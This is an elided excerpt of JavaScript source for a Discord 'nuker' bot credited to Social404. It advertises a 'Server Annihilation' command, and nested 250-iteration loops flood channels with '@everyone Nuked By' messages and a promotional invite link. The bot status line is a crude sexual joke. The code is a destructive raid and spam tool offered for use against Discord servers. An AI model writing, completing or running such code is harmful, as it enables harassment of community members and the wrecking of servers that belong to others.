...
client.on("ready", () => {
    ...
    console.log(red('           ════════════════════════════════════════════════════════════════════════════════'));
    console.log("");
    client.user.setActivity({ type: "PLAYING", name: "Sex With Social404" }); // Delete this if you wish.
});
    ...
    if (message.mentions.everyone === true) {
        ...
        const helpEmbed = new Discord.MessageEmbed()
            ...
            **Server Annihilation:** \`${prefix}die\` [text]
            ...
            .setFooter(`© Presser | Prefix: ${prefix} | Author: Social404 | Cord: ${founder}`)
            .setColor(0x36393E)
                        ...
                        for (var i = 0; i < 250; i++) {
                            ...
                            channels.then(
                                function (channel, index) {
                                    for (var i = 0; i < 250; i++) {
                                        channel.send('@everyone Nuked By https://discord.gg/kE9vk9Zeuf ' + argresult)
